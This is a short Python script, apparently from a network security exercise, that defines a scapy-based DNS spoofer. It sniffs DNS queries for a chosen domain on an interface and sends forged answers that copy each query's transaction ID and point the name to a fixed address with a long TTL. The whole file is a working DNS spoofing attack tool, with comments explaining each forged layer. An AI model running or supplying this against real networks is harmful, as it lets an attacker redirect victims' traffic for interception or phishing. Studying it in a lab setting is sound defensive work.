#!/usr/bin/env python3
import sys
from typing import final

from scapy.all import PacketList, send, sniff
from scapy.layers.dns import DNS, DNSRR
from scapy.layers.inet import IP, UDP


@final
class Spoofer:
    def __init__(self, ns_name: str, if_name: str, filter: str) -> None:
        self.ns_name = ns_name
        self.if_name = if_name
        self.filter = filter

    def spoof_dns(self, pkt: PacketList):
        if DNS in pkt and self.ns_name in pkt[DNS].qd.qname.decode("utf-8"):
            print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
            # Creates an IP object, this is our spoofed answer.
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            # Create a UDP object, spoofed answer UDP "part", since
            # DNS works over UDP (also TCP but we don't care about it now).
            udp = UDP(dport=pkt[UDP].sport, sport=53)
            # Create an answer record, DNS answer section.
            # rr = resource record
            Anssec = DNSRR(
                type="A", ttl=259200, rrname=pkt[DNS].qd.qname, rdata="1.1.1.1"
            )
            # Create a DNS object
            dns = DNS(id=pkt[DNS].id, an=Anssec)
            # Assemble the spoofed DNS packet
            spoofpkt = ip / udp / dns
            _ = send(spoofpkt)

    def spoof(self) -> None:
        sniff(iface=self.if_name, filter=self.filter, prn=self.spoof_dns)
